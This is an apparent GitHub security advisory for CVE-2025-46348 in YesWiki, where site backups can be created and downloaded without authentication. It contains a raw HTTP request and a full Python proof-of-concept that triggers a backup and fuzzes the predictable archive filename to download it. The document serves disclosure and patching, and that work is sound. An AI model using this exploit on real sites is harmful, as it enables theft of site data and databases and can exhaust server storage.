# [C] YesWiki Vulnerable to Unauthenticated Site Backup Creation and Download

## Summary
Severity: Critical
Advisory: GHSA-wc9g-6j9w-hr95
CVE: CVE-2025-46348
CWE: CWE-287, CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2025-04-29
Source: https://github.com/advisories/GHSA-wc9g-6j9w-hr95
Type: github-advisory

## Affected
- Packagist: `yeswiki/yeswiki` — affected >=0 <4.5.4

## Details
### Summary

The request to commence a site backup can be performed without authentication. Then these backups can also be downloaded without authentication. 

The archives are created with a predictable filename, so a malicious user could create an archive and then download the archive without being authenticated. 

### Details

Create an installation using the instructions found in the docker folder of the repository, setup the site, and then send the request to create an archive, which you do not need to be authenticated for: 

```
POST /?api/archives HTTP/1.1
Host: localhost:8085

action=startArchive&params%5Bsavefiles%5D=true&params%5Bsavedatabase%5D=true&callAsync=true
```
Then to retrieve it, make a simple `GET` request like to the correct URL: 
```
http://localhost:8085/?api/archives/2025-04-12T14-34-01_archive.zip
```
A malicious attacker could simply fuzz this filename.

### PoC
Here is a python script to fuzz this: 

```
#!/usr/bin/env python3

import requests
import argparse
import datetime
import time
from urllib.parse import urljoin
from email.utils import parsedate_to_datetime
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Hardcoded proxy config for Burp Suite
BURP_PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def send_post_request(base_url, use_proxy=False):
    url = urljoin(base_url, "/?api/archives")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    }

    data = {
        "action": "startArchive",
        "params[savefiles]": "true",
        "params[savedatabase]": "true",
        "callAsync": "true"
    }

    proxies = BURP_PROXIES if use_proxy else None
    response = requests.post(url, headers=headers, data=data, proxies=proxies, verify=False)
    print(f"[+] Archive start response code: {response.status_code}")

    server_date = response.headers.get("Date")
    if server_date:
        ts = parsedate_to_datetime(server_date)
        print(f"[✓] Server time (from Date header): {ts.strftime('%Y-%m-%d %H:%M:%S')} UTC")
        return ts
    else:
        print("[!] Server did not return a Date header, falling back to local UTC.")
        return datetime.datetime.utcnow()

def try_download_files(base_url, timestamp, use_proxy=False):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    }

    proxies = BURP_PROXIES if use_proxy else None
    print("[*] Trying to download the archive with timestamp fuzzing (±10 seconds)...")

    base_ts = timestamp + datetime.timedelta(hours=2)

    time.sleep(30)  # delay to generate the archive

    for offset in range(-4, 15):
        ts = base_ts + datetime.timedelta(seconds=offset)
        filename = ts.strftime("%Y-%m-%dT%H-%M-%S_archive.zip")
        url = urljoin(base_url, f"/?api/archives/{filename}")
        print(f"[>] Trying: {url}")
        r = requests.get(url, headers=headers, proxies=proxies, verify=False)

        if r.status_code == 200 and r.headers.get("Content-Type", "").startswith("application/zip"):
            print(f"[✓] Archive found and downloaded: {filename}")
            with open(filename, "wb") as f:
                f.write(r.content)
            return

    print("[!] No archive found within the fuzzed window.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Trigger archive and fetch resulting file with timestamp fuzzing.")
    parser.add_argument("host", help="Base host URL, e.g., http://localhost:8085")
    parser.add_argument("-p", "--proxy", action="store_true", help="Route requests through Burp Suite proxy at 127.0.0.1:8080")
    args = parser.parse_args()

    ts = send_post_request(args.host, use_proxy=args.proxy)
    print(f"[+] Archive request sent at (UTC): {ts.strftime('%Y-%m-%d %H:%M:%S')}")

    try_download_files(args.host, ts, use_proxy=args.proxy)
```

### Impact

Denial of Service - A malicious attacker could simply make numerous requests to create archives and fill up the file system with archives. 

Site Compromise - A malicious attacker can download the archive which will contain sensitive site information.

## References
- https://github.com/YesWiki/yeswiki/security/advisories/GHSA-wc9g-6j9w-hr95
- https://nvd.nist.gov/vuln/detail/CVE-2025-46348
- https://github.com/YesWiki/yeswiki/commit/0d4efc880a727599fa4f6d7a64cc967afe475530
- https://github.com/YesWiki/yeswiki
